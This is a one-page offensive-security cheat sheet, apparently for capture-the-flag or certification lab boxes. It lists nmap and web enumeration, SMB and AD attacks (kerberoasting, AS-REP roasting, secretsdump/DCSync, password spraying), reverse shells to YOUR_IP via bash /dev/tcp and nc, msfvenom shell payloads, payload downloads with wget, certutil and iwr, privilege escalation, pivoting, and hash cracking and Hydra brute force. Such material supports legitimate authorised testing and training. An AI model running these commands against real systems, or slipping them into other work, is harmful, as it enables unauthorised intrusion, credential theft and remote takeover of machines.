# Quick Reference (one-page)

> `IP`=target, `YOUR_IP`=your VPN IP (`ip a show tun0`). Full detail lives in the topic docs.

## Scan
```bash
nmap -p- --min-rate 5000 -T4 -Pn $IP -oN all.txt
nmap -p<ports> -sC -sV -O -Pn $IP -oN deep.txt
sudo nmap -sU --top-ports 100 $IP
```

## Web
```bash
whatweb http://$IP ; curl -sI http://$IP
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak
ffuf -u http://$IP -H "Host: FUZZ.$DOMAIN" -w subdomains.txt -fs <size>   # vhost
```

## SMB
```bash
netexec smb $IP -u '' -p '' --shares --rid-brute
smbclient -L //$IP/ -N ; smbmap -H $IP -u null
enum4linux-ng -A $IP
```

## Other services
```bash
ftp $IP                                   # anonymous
snmpwalk -v2c -c public $IP
showmount -e $IP                          # NFS
rpcclient -U "" -N $IP                    # enumdomusers
dig axfr @$IP $DOMAIN                      # DNS zone transfer
```

## Listener + reverse shells
```bash
rlwrap nc -lvnp 4444
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1                                   # linux
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
# windows: use https://revshells.com  (PowerShell #3 / base64)
```

## Stabilize shell (linux)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z → stty raw -echo; fg → Enter Enter
export TERM=xterm; stty rows 50 cols 200
```

## msfvenom
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o s.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o s.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f aspx -o s.aspx
```

## Transfers
```bash
python3 -m http.server 80                 # serve
wget http://YOUR_IP/f -O /tmp/f           # linux pull
certutil -urlcache -f http://YOUR_IP/nc.exe nc.exe   # windows pull
iwr http://YOUR_IP/wp.exe -OutFile C:\Windows\Temp\wp.exe
impacket-smbserver share . -smb2support   # smb serve
```

## Linux privesc
```bash
sudo -l ; id ; uname -a
find / -perm -4000 2>/dev/null            # SUID → GTFOBins
getcap -r / 2>/dev/null ; cat /etc/crontab ; pspy64
./linpeas.sh | tee lp.out
```

## Windows privesc
```cmd
whoami /priv        :: SeImpersonate → PrintSpoofer/GodPotato
whoami /all ; systeminfo ; cmdkey /list
```
```powershell
. .\PowerUp.ps1; Invoke-AllChecks
.\winPEASx64.exe
```

## Active Directory
```bash
netexec smb $DC -u $USER -p "$PASS" --shares            # (Pwn3d!)=admin
netexec smb 10.10.10.0/24 -u $USER -p "$PASS"           # spray/PtH sweep
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC -c All --zip
impacket-GetUserSPNs $DOMAIN/$USER:"$PASS" -dc-ip $DC -request        # kerberoast (13100)
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC # AS-REP (18200)
evil-winrm -i $IP -u $USER -p "$PASS"        # or -H <NTLM>
impacket-psexec $DOMAIN/$USER:"$PASS"@$IP
impacket-secretsdump $DOMAIN/$USER:"$PASS"@$DC           # DCSync / dump
```

## Pivoting
```bash
# Ligolo: ./proxy -selfcert  |  agent -connect YOUR_IP:11601 -ignore-cert  |  ip route add <subnet> dev ligolo; start
# Chisel: ./chisel server -p 8000 --reverse  |  ./chisel client YOUR_IP:8000 R:socks
ssh -D 1080 user@$IP        # then proxychains
```

## Cracking
```bash
hashcat -m 1000 h /usr/share/wordlists/rockyou.txt      # NTLM
hashcat -m 1800 h rockyou.txt                            # linux $6$
hashcat -m 13100 h rockyou.txt ; hashcat -m 18200 h rockyou.txt   # kerb / asrep
john --wordlist=rockyou.txt h ; ssh2john id_rsa > k; zip2john f.zip > z
```

## Hydra
```bash
hydra -L users.txt -P rockyou.txt ssh://$IP
hydra -l admin -P rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

## Golden rules
- Stuck = under-enumerated. Go back and enumerate more.
- Screenshot every flag **with the IP**.
- Every credential → try it everywhere.
- Timebox; rotate boxes; take breaks.
